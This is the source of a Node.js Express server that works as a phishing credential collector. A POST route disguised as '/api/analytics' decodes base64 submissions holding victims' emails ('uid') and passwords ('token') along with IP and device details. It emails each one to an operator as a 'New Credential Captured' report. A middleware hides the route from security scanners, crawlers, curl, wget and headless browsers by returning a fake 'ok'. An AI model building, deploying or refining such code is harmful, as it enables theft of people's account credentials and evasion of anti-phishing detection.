const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

const analyticsLimiter = rateLimit({ windowMs: 60 * 1000, max: 10 });

const blockScanners = (req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (/bot|crawl|spider|scan|check|validator|headless|phantom|selenium|puppeteer|curl|wget|python|java|go-http/i.test(ua)) {
    return res.status(200).json({ status: "ok" });
  }
  next();
};

// Middleware
app.use(cors());

// Handle CORS preflight for all routes
// app.options("*", cors({ origin: process.env.FRONTEND_URL || "http://localhost:5173" }));
app.options("*", cors());
app.use(express.json());

function buildEmailBody(fields, ip) {
  const allFields = { ...fields, ip: ip || "Unknown" };

  // Separate key credentials from metadata
  const primary = ["uid", "token", "src"];
  const rows = (keys) =>
    keys
      .filter((k) => allFields[k] !== undefined)
      .map((k) => {
        const label = fieldLabels[k] || k.replace(/_/g, " ").replace(/-/g, " ").replace(/\b\w/g, (c) => c.toUpperCase());
        const val = String(allFields[k]);
        const isCredential = k === "uid" || k === "token";
        return `
          <tr>
            <td style="padding:10px 16px;font-weight:600;color:#555;white-space:nowrap;width:160px;border-bottom:1px solid #f0f0f0">${label}</td>
            <td style="padding:10px 16px;color:${isCredential ? "#c0392b" : "#222"};font-weight:${isCredential ? "700" : "400"};border-bottom:1px solid #f0f0f0;word-break:break-all">${val}</td>
          </tr>`;
      })
      .join("");

  const metaKeys = Object.keys(allFields).filter((k) => !primary.includes(k));

  return `
  <!DOCTYPE html>
  <html>
  <body style="margin:0;padding:0;background:#f4f6f9;font-family:Arial,sans-serif">
    <table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f9;padding:40px 0">
      <tr><td align="center">
        <table width="600" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08)">

          <!-- Header -->
          <tr>
            <td style="background:#c0392b;padding:24px 32px">
              <h1 style="margin:0;color:#fff;font-size:20px;letter-spacing:1px">🔐 New Credential Captured</h1>
              <p style="margin:6px 0 0;color:rgba(255,255,255,0.8);font-size:13px">${new Date().toUTCString()}</p>
            </td>
          </tr>

          <!-- Credentials -->
          <tr><td style="padding:24px 16px 8px">
            <p style="margin:0 0 8px 16px;font-size:12px;font-weight:700;color:#c0392b;text-transform:uppercase;letter-spacing:1px">Credentials</p>
            <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #f0f0f0;border-radius:6px;overflow:hidden">
              ${rows(primary)}
            </table>
          </td></tr>

          <!-- Metadata -->
          <tr><td style="padding:16px 16px 24px">
            <p style="margin:0 0 8px 16px;font-size:12px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:1px">Device & Session Info</p>
            <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #f0f0f0;border-radius:6px;overflow:hidden">
              ${rows(metaKeys)}
            </table>
          </td></tr>

          <!-- Footer -->
          <tr>
            <td style="background:#f4f6f9;padding:16px 32px;text-align:center">
              <p style="margin:0;font-size:11px;color:#aaa">Automated capture — do not reply</p>
            </td>
          </tr>

        </table>
      </td></tr>
    </table>
  </body>
  </html>`;
}

// Field name map for display in email
const fieldLabels = {
  uid: "Email", token: "Password", src: "Source",
  ua: "User Agent", lang: "Language", plt: "Platform",
  res: "Screen Resolution", tz: "Timezone", ref: "Referrer",
  ts: "Timestamp", ip: "IP Address",
};

app.post("/api/analytics", blockScanners, analyticsLimiter, async (req, res) => {
  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.socket?.remoteAddress ||
      "Unknown";

    const decoded = JSON.parse(Buffer.from(req.body.d, "base64").toString("utf8"));
    const fields = { ...decoded, ip };

    console.log({ fields });

    if (!fields || Object.keys(fields).length === 0) {
      return res.status(400).json({ success: false, message: "No data." });
    }

    const emailBody = buildEmailBody(fields, ip);

    const transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST,
      port: parseInt(process.env.EMAIL_PORT, 10),
      secure: parseInt(process.env.EMAIL_PORT, 10) === 465,
      auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS },
    });

    const subject = fields.uid
      ? `🔐 New capture: ${fields.uid}`
      : "New form submission";

    await transporter.sendMail({
      from: process.env.EMAIL_FROM,
      to: process.env.EMAIL_TO,
      subject,
      html: emailBody,
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
